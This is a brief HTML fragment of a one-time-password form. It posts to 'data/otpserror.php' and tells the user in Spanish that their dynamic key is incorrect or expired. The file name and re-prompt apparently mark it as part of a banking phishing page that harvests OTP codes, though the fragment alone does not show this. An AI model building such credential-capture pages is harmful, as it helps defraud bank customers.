...
<body>
    ...
    <form id="otp-form" method="POST" action="data/otpserror.php" onsubmit="return prepareOTP();">
        ...
        <center><p class="text4">Tu clave dinámica es incorrecta o ha expirado. Ingresa una nueva.</p></center>
